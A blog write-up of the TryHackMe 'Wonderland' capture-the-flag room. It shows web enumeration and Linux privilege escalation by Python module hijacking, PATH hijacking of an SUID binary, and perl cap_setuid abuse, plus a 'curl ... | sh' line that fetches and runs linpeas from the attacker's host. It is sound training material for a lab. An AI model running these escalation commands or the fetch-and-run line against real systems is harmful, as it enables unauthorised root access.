---
title: Tryhackme - Wonderland
author: Rhovelionz
date: 2022-10-05 07:20:00 +0700
categories: [Tryhackme]
tags: [Fuzzing, SSH, Date, SETUID, Perl]
image: /assets/img/Post/wonderland.jpeg

---

>   **Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.**


## **<span style='color:#ff5555'>Summary</span>**
***
- Fuzzing the rabbit directories
- SSH into alice as low user
- Escalate the user to Rabbit
- Analyze the `teaParty` file in our machine
- Abuse the /bin path to get hatter user
- Use perl vulnerability to get root


## **<span style='color:#ff5555'>Port scan</span>**
***

Port 22 running SSH and port 80 running golang http server

```terminal
➜  wonderland nmap -sC -sV -p- -T4 10.10.113.230
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 03:16 UTC
Warning: 10.10.113.230 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.113.230
Host is up (0.34s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp    open     http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
2355/tcp  filtered psdbserver
7599/tcp  filtered unknown
12720/tcp filtered unknown
21834/tcp filtered unknown
33967/tcp filtered unknown
35195/tcp filtered unknown
38367/tcp filtered unknown
41404/tcp filtered unknown
44146/tcp filtered unknown
51048/tcp filtered unknown
57034/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1176.64 seconds
```

## **<span style='color:#ff5555'>Website</span>**
***

Nothing interesting on the website

![]({{ "/images/thm/wonderland/website.png" | relative_url }})


## **<span style='color:#ff5555'>Enumeration</span>**
***

Running Gobuster against the website to find directories that might lead us 

```terminal
➜  wonderland gobuster dir --url http://10.10.113.230/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.230/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 02:50:26 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]

````

`/r `caught my attention, by checking it out, we find an image.

![]({{ "/images/thm/wonderland/keepgoing.png" | relative_url }})

Running gobuster again to check subdirectories in `/r`.

```terminal
➜  wonderland gobuster dir --url http://10.10.113.230/r/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.230/r/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 03:17:39 Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 301) [Size: 0] [--> a/]
Progress: 2323 / 220562 (1.05%)                      ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2022/10/06 03:19:03 Finished
===============================================================
```

Found `/a` subdirectory, by guessing it's going to be `/r/a/b/b/i/t`, to validate it let's check on the browser.

![]({{ "/images/thm/wonderland/rabbit1.png" | relative_url }})

By viewing the source, we found credential for alice which might be useful for ssh since the box has port 22 opened.

![]({{ "/images/thm/wonderland/sourcecode.png" | relative_url }})


## **<span style='color:#ff5555'>SSH as low user</span>**
***

```terminal
➜  wonderland ssh alice@$IP
The authenticity of host '10.10.113.230 (10.10.113.230)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.113.230' (ED25519) to the list of known hosts.
alice@10.10.113.230's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct  6 03:20:22 UTC 2022

  System load:  0.09               Processes:           83
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 29%                IP address for eth0: 10.10.113.230
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
```

`sudo -l` shows something can be useful, user rabbit able to execute python3 and walrus_and_the_carpenter.py. I successfully logged in with the credentials. In the home directory of alice was a python script and a "root.txt" file. Obviously i didn't have access to read the root.txt.

```terminal
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$
```
walrus_and_the_carpenter.py can be exploited because it imports `random`.

So I decided to spawn shell by creating file called `random.py` in the same directory.

```terminal
alice@wonderland:~$ echo 'import os' > random.py
alice@wonderland:~$ echo 'os.system("/bin/sh")' >> random.py
```

Execute the file with /usr/bin/python3.6.

```terminal
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

And we got `Rabbit`.

```terminal
$ whoami
rabbit
```
## **<span style='color:#ff5555'>Privilege Escalation</span>**
***

There is a binary file in `/home/rabbit` that called teaParty

```terminal
$ cd /home
$ cd rabbit
$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

Run the Binary and we receive a message from it

```terminal
$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 06 Oct 2022 04:26:09 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped
```
The binary `teaParty` has SUID permissions, we cannot run strings in this machine, so I decided to transfer it to `/dev/shm` and send it to my machine.

```terminal
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
rabbit@wonderland:/home/rabbit$ ls
teaParty

rabbit@wonderland:/home/rabbit$ cp teaParty /dev/shm/

➜  wonderland scp -r alice@$IP:/dev/shm/teaParty teaParty
alice@10.10.113.230's password:
teaParty                                                             100%   16KB  16.3KB/s   00:01
```

When I run strings against the file to analyze the binary, I found 1 line that mentioned `date` being called but it doesn't specify the path to it. 

Checking the path

```terminal
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
As we can see there are multiple `/bin` at the end, if we created a file called `date`, the system will find that file before getting to `/bin`, and we need to make sure that system will call our date file.

```terminal
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ echo '#!/bin/bash' > /tmp/date
rabbit@wonderland:/home/rabbit$ echo '/bin/bash' >> /tmp/date
rabbit@wonderland:/home/rabbit$ chmod 777 /tmp/date
```

And run the file again

```terminal
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
hatter@wonderland:/home/rabbit$ whoami
hatter
```
There is only 1 file in `hatter` directory, a credential for ssh I believe.

```terminal
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt
*****************************************
```

## **<span style='color:#ff5555'>Road to ROOT</span>**
***

Ssh as hatter with password from the text file.

```terminal
➜  wonderland ssh hatter@$IP
hatter@10.10.113.230's password:
```

Run the `linpeas.sh` as hatter to find vulnerabilities inside this box.

```terminal
➜  linpeas sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.113.230 - - [06/Oct/2022 03:47:32] "GET /linpeas.sh HTTP/1.1" 200 -

hatter@wonderland:~$ curl 10.17.69.235/linpeas.sh | sh

```

I found setuid binary capabilities from linpeas.

```terminal
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

This means any id or uid of 0 gets special privileges running processes, it will skip the restriction when the system found id or uid with 0.

I searched how to bypass this thing and found GTFOBINS has solution regarding `/usr/bin/perl`
To elevate our privileges to root, we need to execute this command as hatter.

```terminal
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Find the user.txt in `/root` directory

```terminal
# cd /root
# ls
user.txt
# cat user.txt
thm****************************
```

And get root.txt in `/home/alice`

```terminal
# cd /home
# ls
alice  hatter  rabbit  tryhackme
# cd alice
# ls
random.py  root.txt  walrus_and_the_carpenter.py
# cat root.txt
thm********************************
#
```

***

![]({{ "/images/mandatory/pwned.png" | relative_url }})



> [Wonderland - Tryhackme](https://tryhackme.com/room/wonderland)